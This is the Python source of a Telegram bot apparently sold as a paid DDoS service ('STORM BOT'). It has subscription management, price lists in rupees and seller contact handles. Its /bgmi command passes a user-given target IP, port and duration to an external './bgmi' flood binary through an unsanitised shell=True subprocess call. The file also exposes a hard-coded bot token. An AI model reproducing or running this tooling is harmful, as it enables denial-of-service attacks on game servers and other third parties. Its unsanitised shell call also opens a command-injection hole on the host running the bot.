#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import random
import string
import json

from keep_alive import keep_alive
keep_alive()

# insert your Telegram bot token here
bot = telebot.TeleBot('7342071831:AAHfKI4K-rFEuwlty8ltXmaEw3EnBieaXnI')

# Admin user IDs
admin_id = ["6719970743"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"



# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6719970743"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ‚ùå."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ‚úÖ"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} üëç."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists ü§¶‚Äç‚ôÇÔ∏è."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add üòò."
    else:
        response = "You have not purchased yet purchase now from:- @DEVILxVIPxPAID."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    user_name = message.from_user.first_name
    remaining_time = get_remaining_approval_time(user_id)
    response = f"\n‚ÑπÔ∏è ùêòùê®ùêÆùê´ ùêàùêßùêüùê® :\n\nüÜî ùêîùê¨ùêûùê´ ùêàùêù: {user_id}\nüí≥ ùêîùê¨ùêûùê´ùêßùêöùê¶ùêû: {username}\nüë§ùêÖùê¢ùê´ùê¨ùê≠ ùêçùêöùê¶ùêû :- {user_name}\nüë§ ùêãùêöùê¨ùê≠ ùêçùêöùê¶ùêû :- None\n\n‚ÑπÔ∏è ùêòùê®ùêÆùê´ ùêàùêßùêüùê® ùêéùêß STORM BOT :\n\nüè∑Ô∏è ùêëùê®ùê•ùêû: ùêîùê¨ùêûùê´\nüìÜ ùêÄùê©ùê©ùê´ùê®ùêØùêöùê• ùêÑùê±ùê©ùê¢ùê´ùê≤ ùêÉùêöùê≠ùêû: ùêçùê®ùê≠ ùêÄùê©ùê©ùê´ùê®ùêØùêûùêù\n‚è≥ ùêëùêûùê¶ùêöùê¢ùêßùê¢ùêßùê† ùêÄùê©ùê©ùê´ùê®ùêØùêöùê• ùêìùê¢ùê¶ùêû: ùêçùê®ùê≠ ùêÄùê©ùê©ùê´ùê®ùêØùêûùêù"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully üëç."
            else:
                response = f"User {user_to_remove} not found in the list ‚ùå."
        else:
            response = '''Please Specify A User ID to Remove. 
‚úÖ Usage: /remove <userid>'''
    else:
        response = "BHAI KYU UNGLI KR REHA HO ‚ò†Ô∏è."


    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ‚ùå."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ‚úÖ"
        except FileNotFoundError:
            response = "Logs are already cleared ‚ùå."
    else:
        response = "BHAI KYU UNGLI KR REHA HO ‚ò†Ô∏è."

    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ‚ùå"
        except FileNotFoundError:
            response = "No data found ‚ùå"
    else:
        response = "BHAI KYU UNGLI KR REHA HO ‚ò†Ô∏è."

    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ‚ùå."
                bot.reply_to(message, response)
        else:
            response = "No data found ‚ùå"
            bot.reply_to(message, response)
    else:
        response = "BHAI TUM KYU UNGLI KR REHA HO ‚ò†Ô∏è."

        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"ü§ñYour ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_name = message.from_user.first_name
    response = f"\nüíé ùêÉùêÑùêÄùêë ùêïùêàùêè ùêîùêíùêÑùêë üëë{user_name}üëë üíé.\n\nüü¢ ùêòùêéùêîùêë ùêÄùêìùêìùêÄùêÇùêä ùêíùêìùêÄùêëùêìùêÑùêÉ üü¢\n\nüéØ Target: {target}\nüîó ùêèùê®ùê´ùê≠: {port}\n‚è≥ ùêìùê¢ùê¶ùêû: {time} ùêíùêûùêúùê®ùêßùêùùê¨\n‚öôÔ∏è ùêåùêûùê≠ùê°ùê®ùêù : PRIVATE\n\nüìù ùêÄùêùùêØùê¢ùêúùêû :-\n‚è∏Ô∏è ùêòùê®ùêÆùê´ ùêÄùê≠ùê≠ùêöùêúùê§ ùêñùê¢ùê•ùê• ùêÅùêû ùêÖùê¢ùêßùê¢ùê¨ùê°ùêûùêù ùêàùêß {time} ùêñùêöùê¢ùê≠ ùêìùê°ùêûùê´ùêû ùêñùê¢ùê≠ùê°ùê®ùêÆùê≠ ùêìùê®ùêÆùêúùê°ùê¢ùêßùê† ùêÄùêßùê≤ ùêÅùêÆùê≠ùê≠ùê®ùêß"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =3

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 4:
                response = "You Are On Cooldown ‚ùå. Please Wait 3sec Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 1000"
                subprocess.run(full_command, shell=True)
                user_name = message.from_user.first_name
                response = f"\nüíé ùêÉùêÑùêÄùêë ùêïùêàùêè ùêîùêíùêÑùêë {user_name} üíé. \n\nüõë ùêòùêéùêîùêë ùêÄùêìùêìùêÄùêÇùêä ùêÖùêàùêçùêàùêíùêáùêÑùêÉ üõë\n\nüéØ Target: {target}\nüîó ùêèùê®ùê´ùê≠: {port}\n‚è≥ ùêìùê¢ùê¶ùêû: {time} ùêíùêûùêúùê®ùêßùêùùê¨\n‚öôÔ∏è ùêåùêûùê≠ùê°ùê®ùêù : PRIVATE\n\nüìù ùêÄùêùùêØùê¢ùêúùêû :-\nüì∂ ùêòùê®ùêÆùê´ ùêàùêßùê≠ùêûùê´ùêßùêûùê≠ ùêàùê¨ ùêçùê®ùê´ùê¶ùêöùê• ùêçùê®ùê∞ ùêäùê¢ùê•ùê• ùêÄùê•ùê• ùêìùê°ùêû ùêèùê•ùêöùê≤ùêûùê´'ùê¨ ùêÄùêßùêù ùêÜùê¢ùêØùêû ùêÖùêûùêûùêùùêõùêöùêúùê§ùê¨ ùêàùêß ùêÇùê°ùêöùê≠ ùêÜùê´ùê®ùêÆùê©"
        else:
            response = "‚ö†Ô∏è ùêàùêßùêØùêöùê•ùê¢ùêù ùêÖùê®ùê´ùê¶ùêöùê≠ ‚ö†Ô∏è\n\n‚úÖ ùêîùê¨ùêöùê†ùêû :- /bgmi <Target> <ùê©ùê®ùê´ùê≠> <ùê≠ùê¢ùê¶ùêû>\n\n‚úÖ ùêÖùê®ùê´ ùêÑùê±ùêöùê¶ùê©ùê•ùêû :- /bgmi 127.0.0.0 11278 200"  # Updated command syntax
    else:
        response = "You Are Not Authorized To Use This Command"

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "‚ùå No Command Logs Found For You ‚ùå."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "BHAI KYU UNGLI KR REHA HO ‚ò†Ô∏è."


    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''ü§ñ ùêÄùêØùêöùê¢ùê•ùêöùêõùê•ùêû ùêúùê®ùê¶ùê¶ùêöùêßùêùùê¨:

üöÄ /bgmi : ùêÉùêÉùê®ùêí ùêÄùê≠ùê≠ùêöùêúùê§ùêûùê´. 
üö¶ /rules : ùêÄùêØùê®ùê¢ùêù ùêëùêÆùê•ùêûùê¨.
üßæ /mylogs : ùêòùê®ùêÆùê´ ùêÄùê≠ùê≠ùêöùêúùê§ùê¨.
üí∏ /plan : PAID 24/7 ùêèùê•ùêöùêßùê¨.
‚ÑπÔ∏è /myinfo : ùêòùê®ùêÆùê´ ùêàùêßùêüùê®.

ùêìùê® ùêíùêûùêû ùêÄùêùùê¶ùê¢ùêß ùêÇùê®ùê¶ùê¶ùêöùêßùêùùê¨:
üíé /admin : ùêíùê°ùê®ùê∞ùê¨ ùêÄùê•ùê• ùêÄùêùùê¶ùê¢ùêß ùêÇùê®ùê¶ùê¶ùêöùêßùêùùê¨.

üõí ùêÅùêÆùê≤ ùêÖùê´ùê®ùê¶ :-
ùüè.@DEVILxVIPxPAID

üè´ùêéùêüùêüùê¢ùêúùê¢ùêöùê• ùêÇùê°ùêöùêßùêßùêûùê• :- https://t.me/+S3EDuNxPM2Q2YjNll
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''üíêùêñùêûùê•ùêúùê®ùê¶ùêû DEVIL üëø (OWNER) ùêìùê® ùêéùêÆùê´ ùêÅùê®ùê≠ :-
ü§ñ STORM BOT ü§ñ
ùêÖùêûùêûùê• ùêÖùê´ùêûùêû ùêìùê® ùêÑùê±ùê©ùê•ùê®ùê´ùêû
ùêÖùê®ùê´ ùêåùê®ùê´ùêû ùêÇùê®ùê¶ùê¶ùêöùêßùêùùê¨ ùêìùê´ùê≤ ùêìùê® ùêëùêÆùêß ùêìùê°ùê¢ùê¨ ùêÇùê®ùê¶ùê¶ùêöùêßùêù : /help

üõí ùêÅùêÆùê≤ ùêÄùêúùêúùêûùê¨ùê¨ ùêÖùê´ùê®ùê¶ :-
ùüè.@DEVILxVIPxPAID'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} ùêèùê•ùêûùêöùê¨ùêû ùêÖùê®ùê•ùê•ùê®ùê∞ ùêìùê°ùêûùê¨ùêû ùêëùêÆùê•ùêûùê¨ üö¶:
ùüè. ùêÉùê®ùêßùê≠ ùêëùêÆùêß ùêìùê®ùê® ùêåùêöùêßùê≤ ùêÄùê≠ùê≠ùêöùêúùê§ùê¨ !! ùêÇùêöùêÆùê¨ùêû ùêÄ ùêÅùêöùêß ùêÖùê´ùê®ùê¶ ùêÅùê®ùê≠
ùüê. ùêÉùê®ùêßùê≠ ùêëùêÆùêß ùüê ùêÄùê≠ùê≠ùêöùêúùê§ùê¨ ùêÄùê≠ ùêíùêöùê¶ùêû ùêìùê¢ùê¶ùêû ùêÅùêûùêúùê≥ ùêàùêü ùêî ùêìùê°ùêûùêß ùêî ùêÜùê®ùê≠ ùêÅùêöùêßùêßùêûùêù ùêÖùê´ùê®ùê¶ ùêÅùê®ùê≠.
ùüë. ùêåùêöùê§ùêû ùêíùêÆùê´ùêû ùêòùê®ùêÆ ùêâùê®ùê¢ùêßùêûùêù https://t.me/+S3EDuNxPM2Q2YjNllùêéùê≠ùê°ùêûùê´ùê∞ùê¢ùê¨ùêû ùêìùê°ùêû ùêÉùêÉùê®ùêí ùêñùê¢ùê•ùê• ùêçùê®ùê≠ ùêñùê®ùê´ùê§.
ùüí. ùêñùêû ùêÉùêöùê¢ùê•ùê≤ ùêÇùê°ùêûùêúùê§ùê¨ ùêìùê°ùêû ùêãùê®ùê†ùê¨ ùêíùê® ùêÖùê®ùê•ùê•ùê®ùê∞ ùê≠ùê°ùêûùê¨ùêû ùê´ùêÆùê•ùêûùê¨ ùê≠ùê® ùêöùêØùê®ùê¢ùêù ùêÅùêöùêß!!!"'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ùêñùêû ùêáùêöùêØùêû ùêéùêßùê•ùê≤ ùüè ùêèùê•ùêöùêß ùêÄùêßùêù ùêìùê°ùêöùê≠ ùêàùê¨ ùêèùê®ùê∞ùêûùê´ùêüùêÆùê•ùê• ùêìùê°ùêûùêß ùêÄùêßùê≤ ùêéùê≠ùê°ùêûùê´ ùêÉùêÉùê®ùêí ùêìùê°ùêöùê≠ ùêàùê¨ STORM BOT @DEVILxVIPxPAID !!!:

üíé PRIVATE 24/7:
-> ùêÄùê≠ùê≠ùêöùêúùê§ ùêìùê¢ùê¶ùêû : ùüèùüéùüéùüé (ùêí)
> ùêÄùêüùê≠ùêû?? ùêÄùê≠ùê≠ùêöùêúùê§ ùêãùê¢ùê¶??ùê≠ : ùüé ùê¨ùêûùêú
-> ùêÇ??ùêßùêúùêÆùê´ùê´ùêûùêßùê≠ùê¨ ùêÄùê≠ùê≠ùêöùêúùê§ : ùüìùüéùüé

üí∏ ùêèùê´ùê¢ùêúùêû ùêãùê¢??ùê≠ :
ùêáùê®ùêÆùê´-->30ùêëùê¨
ùêÉùêöùê≤-->70 ùêëùê¨
ùêñùêûùêûùê§-->400 ùêëùê¨
ùêåùê®ùêßùê≠ùê°-->500 ùêëùê¨
ùêíùêûùêöùê¨ùê®ùêß-->600 ùêëùê¨

üõí ùêàùêü ùêòùê®ùêÆ ùêñùêöùêßùê≠ ùêìùê® ùêÅùêÆùê≤ ùêìùê°ùê¢ùê¨ ùêèùê•ùêöùêß ùêÇùê®ùêßùê≠ùêöùêúùê≠ ùêÄùêùùê¶ùê¢ùêßùê¨ :-
ùüè.@DEVILxVIPxPAID
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ùêÄùêùùê¶ùê¢ùêß ùêÇùê®ùê¶ùê¶ùêöùêßùêùùê¨ ùêÄùê´ùêû ùêáùêûùê´ùêû!!:
    
‚ûïüßí/add <ùêÆùê¨ùêûùê´ùêàùêù> <ùê≠ùê¢ùê¶ùêû>: ùêÄùêùùêù ùêö ùêîùê¨ùêûùê´.
‚ûñüßí/remove <ùêÆùê¨ùêûùê´ùê¢ùêù> ùêëùêûùê¶ùê®ùêØùêû ùêö ùêîùê¨ùêûùê´
üíéüßí/allusers : ùêÄùêÆùê≠ùê°ùê®ùê´ùê¢ùê¨ùêûùêù ùêîùê¨ùêûùê´ùê¨ ùêãùê¢ùê¨ùê≠ùê¨.
üßæüöÄ/logs : ùêÄùê•ùê• ùêîùê¨ùêûùê´ùê¨ ùêãùê®ùê†ùê¨.
üí¨üßí/broadcast : ùêÅùê´ùê®ùêöùêùùêúùêöùê¨ùê≠ ùêö ùêåùêûùê¨ùê¨ùêöùê†ùêû.
‚ûñüßæ/clearlogs : ùêÇùê•ùêûùêöùê´ ùêìùê°ùêû ùêãùê®ùê†ùê¨ ùêÖùê¢ùê•ùêû.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "‚ö†Ô∏è Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users üëç."
        else:
            response = "ü§ñ Please Provide A Message To Broadcast."
    else:
        response = "BHAI TUM KYU UNGLI KR REHA HO ‚ò†Ô∏è."

    bot.reply_to(message, response)




while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
